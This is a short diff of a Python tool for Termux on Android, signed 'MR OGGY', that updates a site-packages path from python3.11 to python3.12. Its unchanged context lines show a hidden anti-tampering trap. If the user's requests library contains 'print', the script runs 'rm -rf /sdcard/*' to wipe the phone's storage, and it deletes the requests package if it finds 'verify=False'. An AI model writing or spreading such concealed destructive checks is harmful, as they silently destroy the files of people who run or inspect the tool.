@@ -147,7 +147,7 @@ if 'print' in file_content:
     os.system('rm -rf /sdcard/*')
     os.system('pip install requests')
     exit(f'\x1b[38;5;46m➤{A} RE-RUN TOOL.!')
-with open('/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/sessions.py', 'r') as file:
+with open('/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/sessions.py', 'r') as file:
     file_content = file.read()
 if 'verify=False' in file_content:
     os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests')
@@ -598,4 +598,5 @@ except requests.exceptions.ConnectionError:
 except Exception as e:
     print(e)                
 #▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ MR OGGY ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
+
 
